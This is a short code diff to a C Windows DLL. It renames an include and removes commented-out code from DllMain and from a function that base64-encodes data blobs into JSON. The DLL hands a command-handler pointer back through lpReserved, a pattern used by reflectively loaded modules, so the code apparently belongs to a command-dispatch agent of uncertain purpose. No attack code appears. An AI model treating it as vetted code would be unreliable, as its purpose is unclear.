@@ -19,7 +19,7 @@ def bmp():
 #include <stdio.h>
 #include "base64.h"
 #include "common.h"
-#include "commandlist.h"
+#include "commandnode.h"
 #include "zlib/zlib.h"
 #include "cJSON/cJSON.h"
 
@@ -75,7 +75,6 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
                 #ifdef DEBUG
                 MessageBox(NULL, "Setting lpReserved!", "d", MB_ICONINFORMATION);
                 #endif
-                // *(HMODULE *)lpReserved = ShowMessageBox;
                 *(CommandNodePointer*)lpReserved = GetGadgetCommand;
             }
             break;
@@ -215,15 +214,6 @@ char* BlobsToJson(DataBlobs* data) {
         cJSON_AddNumberToObject(jsonBuffer, "size", data->sizes[i]);
         
         char* base64Buffer = base64_encode(data->buffers[i], data->sizes[i], NULL);
-        // // Encode buffer as a base64 string
-        // char* base64Buffer = (char*)malloc(((data->sizes[i] + 2) / 3) * 4 + 1);
-        // if (!base64Buffer) {
-        //     cJSON_Delete(jsonData);
-        //     return NULL;
-        // }
-        // int base64Length = Base64Encode(data->buffers[i], data->sizes[i], base64Buffer);
-        // base64Buffer[base64Length] = '\0';
-        
         cJSON_AddStringToObject(jsonBuffer, "data", base64Buffer);
         free(base64Buffer);
 
